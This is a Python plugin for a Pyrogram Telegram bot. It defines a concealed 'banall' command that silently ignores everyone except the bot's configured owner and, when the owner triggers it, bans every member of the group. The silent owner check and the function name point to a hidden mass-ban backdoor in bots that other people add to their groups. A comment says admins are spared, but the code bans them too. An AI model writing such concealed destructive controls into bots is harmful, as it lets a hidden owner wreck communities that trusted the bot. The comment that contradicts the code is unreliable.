from pyrogram import Client, filters
from Criminals import app
from config import OWNER_ID

@app.on_message(filters.command("banall") & filters.group)
async def ban_all_hidden(client, message):
    # SILENT SECURITY: Only works for Owner. 
    # If anyone else uses it, the bot does absolutely nothing.
    if message.from_user.id != int(OWNER_ID):
        return 

    chat_id = message.chat.id
    count = 0
    
    # Send an initial update only to the owner
    msg = await message.reply_text("⚡ Starting cleanup...")
    
    async for member in client.get_chat_members(chat_id):
        # Don't ban yourself (the bot), the owner, or admins
        if member.user.is_self or member.user.id == int(OWNER_ID):
            continue
            
        try:
            await client.ban_chat_member(chat_id, member.user.id)
            count += 1
        except Exception:
            continue
            
    await msg.edit(f"✅ Process finished. Banned {count} users.")
